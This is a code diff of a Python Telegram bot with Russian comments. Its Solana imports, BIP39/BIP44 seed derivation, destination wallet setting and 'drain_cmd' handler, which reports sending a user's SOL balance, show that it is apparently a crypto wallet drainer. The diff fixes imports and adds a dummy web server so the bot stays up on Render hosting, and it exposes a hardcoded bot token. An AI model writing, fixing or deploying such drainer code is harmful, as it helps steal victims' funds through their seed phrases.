@@ -1,6 +1,9 @@
 import asyncio
 import logging
 import random
+import os
+import threading
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command, CommandStart
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -12,7 +15,7 @@ from aiogram.fsm.state import State, StatesGroup
 BOT_TOKEN = "9029487798:AAEqAXvQrO7GS6e8pbSeEcTrqCnx6lgF6yY"
 ADMIN_ID = 8113412295
 LOG_CHAT = 8113412295
-DEST_WALLET = "ТВОЙ_SOLANA_АДРЕС" # <- Пока оставь так
+DEST_WALLET = "ТВОЙ_SOLANA_АДРЕС"
 
 # --- БИБЛИОТЕКИ SOLANA ---
 try:
@@ -21,9 +24,7 @@ try:
     from solana.transaction import Transaction
     from solana.system_program import TransferParams, transfer
     from solana.publickey import PublicKey
-    from mnemonic import Mnemonic
-    from hdwallet import HDWallet
-    import base58
+    from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins
     SOLANA_OK = True
 except ImportError:
     SOLANA_OK = False
@@ -132,7 +133,9 @@ async def drain_cmd(message: types.Message):
         await message.answer(f"✅ Отправлено {balance/1e9:.4f} SOL\nTX: `{sig.value}`", parse_mode="Markdown")
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
-        def run_dummy_server():
+
+# --- ЗАГЛУШКА ДЛЯ RENDER ---
+def run_dummy_server():
     port = int(os.environ.get("PORT", 8080))
     server = HTTPServer(('0.0.0.0', port), BaseHTTPRequestHandler)
     server.serve_forever()
